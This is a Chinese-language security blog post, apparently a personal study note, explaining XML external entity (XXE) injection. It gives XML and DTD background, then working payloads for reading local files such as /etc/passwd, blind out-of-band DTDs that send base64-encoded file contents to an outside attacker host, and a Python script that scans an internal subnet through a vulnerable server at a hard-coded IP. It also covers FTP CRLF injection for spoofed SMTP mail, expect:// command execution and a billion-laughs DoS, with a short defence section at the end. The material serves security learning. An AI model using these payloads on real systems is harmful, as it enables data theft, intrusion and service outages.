<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		
		<meta name="author" content="ifish">
		
		<meta name="generator" content="Hugo 0.54.0" />
		<title>xxe &middot; if1sh</title>
		<link rel="shortcut icon" href="https://ifishzz.github.io//images/favicon.ico">
		<link rel="stylesheet" href="https://ifishzz.github.io//css/style.css">
		<link rel="stylesheet" href="https://ifishzz.github.io//css/highlight.css">

		
		<link rel="stylesheet" href="https://ifishzz.github.io//css/font-awesome.min.css">
		

		
		<link href="https://ifishzz.github.io/index.xml" rel="alternate" type="application/rss+xml" title="if1sh" />
		

		
	</head>

    <body>
       <nav class="main-nav">
	
	
		<a href='https://ifishzz.github.io/'> <span class="arrow">←</span>Home</a>
	
	<a href='https://ifishzz.github.io//posts'>Archive</a>
	
	<a href='https://ifishzz.github.io//categories'>Cate</a>
	<a href='https://ifishzz.github.io//links'>Link</a>

	<a href='https://ifishzz.github.io//about'>About</a>

	

	
	<a class="cta" href="https://ifishzz.github.io/index.xml">Subscribe</a>
	
</nav>


        <section id="wrapper" class="post">
            <article>
                <header>
                    <h1>
                        xxe
                    </h1>
                    <h2 class="headline">
                    Jan 24, 2019 00:00
                    · 3167 words
                    · 7 minute read
                      <span class="tags">
                      
                      
                          
                              <a href="https://ifishzz.github.io//tags/xxe">xxe</a>
                          
                      
                      
                      </span>
                    </h2>
                </header>
                
                  
                    <div id="toc">
                      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#0x00-xxe是什么">0x00 xxe是什么</a></li>
<li><a href="#0x01-xml基础">0x01 xml基础</a>
<ul>
<li><a href="#dtd">DTD</a></li>
<li><a href="#实体">实体</a></li>
</ul></li>
<li><a href="#0x02-能用xxe做什么">0x02 能用xxe做什么</a></li>
<li><a href="#0x03-如何找到xxe">0x03 如何找到xxe</a></li>
<li><a href="#0x04-xxe利用">0x04 xxe利用</a>
<ul>
<li><a href="#normal-xxe">Normal XXE</a></li>
<li><a href="#blind-oob-xxe">Blind OOB XXE</a></li>
<li><a href="#http内网主机探测">http内网主机探测</a></li>
<li><a href="#http内网主机端口扫描">http内网主机端口扫描</a></li>
<li><a href="#钓鱼">钓鱼</a></li>
<li><a href="#php-expect-rce">PHP expect RCE</a></li>
<li><a href="#xxe-dos">xxe dos</a></li>
<li><a href="#json-content-type-xxe">JSON content-type XXE</a></li>
</ul></li>
<li><a href="#0x05-xxe防御">0x05 xxe防御</a></li>
<li><a href="#0x06-参考资料">0x06 参考资料</a></li>
</ul></li>
</ul>
</nav>
                    </div>
                  
                
                <section id="post-body">
                    

<h2 id="0x00-xxe是什么">0x00 xxe是什么</h2>

<p>xml外部实体注入</p>

<h2 id="0x01-xml基础">0x01 xml基础</h2>

<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>

<pre><code>&lt;!--XML申明--&gt;
&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;!--文档类型定义--&gt;
&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
]]]&gt;
&lt;!--文档元素--&gt;
&lt;note&gt;
&lt;to&gt;Dave&lt;/to&gt;
&lt;from&gt;Tom&lt;/from&gt;
&lt;head&gt;Reminder&lt;/head&gt;
&lt;body&gt;You are a good man&lt;/body&gt;
&lt;/note&gt;
</code></pre>

<p>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记</p>

<p>CDATA 是不会被解析器解析的文本</p>

<p>ENTITY 值是一个实体</p>

<h3 id="dtd">DTD</h3>

<p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p>

<p>内部声明DTD:
<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>

<p>引用外部DTD:
<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;存放元素声明的文件的URI，可以是本地文件或网络文件&quot; [可选的元素声明]&gt;</code></p>

<p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;PUBLIC_ID DTD的名称&quot; &quot;外部DTD文件的URI&quot;&gt;</code></p>

<p>（ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）</p>

<h3 id="实体">实体</h3>

<p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值</p>

<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>

<p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。</p>

<p>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p>

<p>&amp;普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用</p>

<p>%参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用</p>

<p><em>最重要的是,外部实体引用</em></p>

<p>通用实体:</p>

<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE data [
    &lt;!ENTITY dtd SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 
]&gt; 
&lt;ifish&gt;  
    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;   
&lt;/ifish&gt;
</code></pre>

<p>参数实体:</p>

<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE data [
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; 
%dtd; %all; 
]&gt; 
&lt;value&gt;&amp;send;&lt;/value&gt;
</code></pre>

<p>evil.xml:</p>

<pre><code> &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;&quot;&gt;
</code></pre>

<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用通用实体send,参数实体只能在DTD中调用</p>

<p>不同程序支持的协议不同
<img src="/images/xxe1.png" alt="" /></p>

<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有
<img src="/images/xxe2.png" alt="" /></p>

<h2 id="0x02-能用xxe做什么">0x02 能用xxe做什么</h2>

<p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了:-)</p>

<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>

<h2 id="0x03-如何找到xxe">0x03 如何找到xxe</h2>

<p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据:</p>

<ul>
<li>单双引号 &lsquo; &ldquo; 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li>
<li>尖括号&lt; &gt;。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li>
<li>注释符 <!-- 。XML使用 <!-- This is a comment --> 作注释。</li>
<li>&amp; 。&amp; 用于引用实体。</li>
<li>CDATA 分隔符]]&gt; 。&lt;![CDATA[foo]]&gt; 中的内容不被parser解析，提前闭合引发异常。</li>
</ul>

<p>尝试利用实体和DTD:</p>

<ul>
<li>引用外部DTD文件访问内网主机/端口。&lt;!DOCTYPE a SYSTEM &ldquo;<a href="http://127.0.0.1:2333&quot;&gt;">http://127.0.0.1:2333&quot;&gt;</a> （看响应时间）</li>
<li>引用外部DTD文件访问外网。&lt;!DOCTYPE a SYSTEM &ldquo;<a href="http://vps_ip&quot;">http://vps_ip&quot;</a> &gt;</li>
<li>引用内部实体。&lt;!DOCTYPE a [&lt;!ENTITY xxe &ldquo;findneo&rdquo;&gt;]&gt;<a>&xxe;</a></li>
<li>外部实体读本地文件。&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &ldquo;file:///etc/hosts&rdquo;&gt;]&gt;<a>&xxe;</a></li>
<li>外部实体访问内网主机/端口。&lt;!DOCTYPE a SYSTEM &ldquo;<a href="http://192.168.1.2:80&quot;&gt;（看响应时间）">http://192.168.1.2:80&quot;&gt;（看响应时间）</a></li>
<li>外部实体访问外网。&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &ldquo;<a href="http://vps_ip&quot;&gt;]&gt;">http://vps_ip&quot;&gt;]&gt;</a><a>&xxe;</a></li>
<li>判断问题存在可以OOB提取数据。</li>
</ul>

<p>旧版的awvs有xxe验证</p>

<h2 id="0x04-xxe利用">0x04 xxe利用</h2>

<h3 id="normal-xxe">Normal XXE</h3>

<ul>
<li>无特殊符号读取</li>
</ul>

<p>xml.php</p>

<pre><code>&lt;?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?&gt;
</code></pre>

<p>payload:</p>

<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dtd [  
&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
&lt;ifish&gt;&amp;file;&lt;/ifish&gt;
</code></pre>

<ul>
<li>有特殊符号读取</li>
</ul>

<p>把数据放在 CDATA 中输出就能进行绕过</p>

<p>payload:</p>

<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
%dtd; ]&gt; 

&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
</code></pre>

<p>evil.dtd</p>

<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre>

<p>利用外部dtd,将实体拼接,不能在xml直接拼接</p>

<h3 id="blind-oob-xxe">Blind OOB XXE</h3>

<p>xml.php</p>

<pre><code>&lt;?php

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?&gt;
</code></pre>

<p>payload1：</p>

<pre><code>&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
</code></pre>

<p>test.dtd:</p>

<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999?p=%file;'&gt;&quot;&gt;
</code></pre>

<p>or</p>

<p>payload2:</p>

<pre><code>&lt;!DOCTYPE a [ 
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&gt;
%dtd;
%mydata;
]&gt;
</code></pre>

<p>attack.dtd：</p>

<pre><code>&lt;!ENTITY % all
&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &quot;http://www.hackersb.cn/?%file&quot;&gt;&quot;
&gt;
</code></pre>

<p>发送payload以后就可以在<a href="http://www.hackersb.cn/的访问日志中看到请求且带上了/etc/passwd文件base64加密以后的内容">http://www.hackersb.cn/的访问日志中看到请求且带上了/etc/passwd文件base64加密以后的内容</a></p>

<h3 id="http内网主机探测">http内网主机探测</h3>

<p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>

<p>探测脚本:</p>

<pre><code>import requests
import base64

#Origtional XML that the server accepts
#&lt;xml&gt;
#    &lt;stuff&gt;user&lt;/stuff&gt;
#&lt;/xml&gt;


def build_xml(string):
    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + '&quot;' + string + '&quot;' + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
</code></pre>

<h3 id="http内网主机端口扫描">http内网主机端口扫描</h3>

<p>利用burp遍历端口</p>

<h3 id="钓鱼">钓鱼</h3>

<p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p>

<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>

<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>

<p>ex:</p>

<pre><code>ftp://a%0D%0A
EHLO%20a%0D%0A
MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
DATA%0D%0A
From%3A%20support%40VULNERABLESYSTEM.com%0A
To%3A%20victim%40gmail.com%0A
Subject%3A%20test%0A
%0A
test!%0A
%0D%0A
.%0D%0A
QUIT%0D%0A
:a@VULNERABLESYSTEM.com:25
</code></pre>

<h3 id="php-expect-rce">PHP expect RCE</h3>

<p>PHP的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>

<p>payload:</p>

<pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;
&lt;dir&gt;
&lt;file&gt;&amp;cmd;&lt;/file&gt;
&lt;/dir&gt;
</code></pre>

<h3 id="xxe-dos">xxe dos</h3>

<p>payload:</p>

<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
     &lt;!DOCTYPE lolz [
     &lt;!ENTITY lol &quot;lol&quot;&gt;
     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
     ]&gt;
     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</code></pre>

<h3 id="json-content-type-xxe">JSON content-type XXE</h3>

<p>很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p>

<p>原始请求和响应：</p>

<p>HTTP Request:</p>

<pre><code>POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/json
Content-Length: 38


{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}
</code></pre>

<p>HTTP Response:</p>

<pre><code>HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 43

{&quot;error&quot;: &quot;no results for name netspitest&quot;}
现在我们尝试将 Content-Type 修改为 application/xml
</code></pre>

<p>进一步请求和响应：</p>

<p>HTTP Request:</p>

<pre><code>POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 38

{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}
</code></pre>

<p>HTTP Response:</p>

<pre><code>HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Content-Length: 127

{&quot;errors&quot;:{&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;}}
可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击
</code></pre>

<p>最终的请求和响应：</p>

<p>HTTP Request:</p>

<pre><code>POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 288

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;search&gt;name&lt;/search&gt;
&lt;value&gt;&amp;xxe;&lt;/value&gt;
&lt;/root&gt;
</code></pre>

<p>HTTP Response:</p>

<pre><code>HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 2467

{&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync....
</code></pre>

<h2 id="0x05-xxe防御">0x05 xxe防御</h2>

<p>使用语言中推荐的禁用外部实体的方法</p>

<p>PHP：</p>

<pre><code>libxml_disable_entity_loader(true);
</code></pre>

<p>JAVA:</p>

<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);

.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)

.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
</code></pre>

<p>Python：</p>

<pre><code>from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</code></pre>

<h2 id="0x06-参考资料">0x06 参考资料</h2>

<p><a href="https://xz.aliyun.com/t/3357#toc-15">https://xz.aliyun.com/t/3357#toc-15</a></p>

<p><a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>

<p><a href="https://security.tencent.com/index.php/blog/msg/69">https://security.tencent.com/index.php/blog/msg/69</a></p>

<p><a href="https://www.freebuf.com/column/156863.html">https://www.freebuf.com/column/156863.html</a></p>

<p><a href="https://xz.aliyun.com/t/2571">https://xz.aliyun.com/t/2571</a></p>

<p><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-5-1-2">https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-5-1-2</a></p>

                </section>
            </article>

            
                

            

            

            

            <footer id="footer">
    
    
    <p class="small">
        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/ifishzz">ifish</a>
    </p>
</footer>

        </section>

        <script src="https://ifishzz.github.io//js/jquery-3.3.1.min.js"></script>
<script src="https://ifishzz.github.io//js/main.js"></script>
<script src="https://ifishzz.github.io//js/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




  



<script>
var baiduAnalytics = '';
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?" + baiduAnalytics;
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
</script>


    </body>
</html>
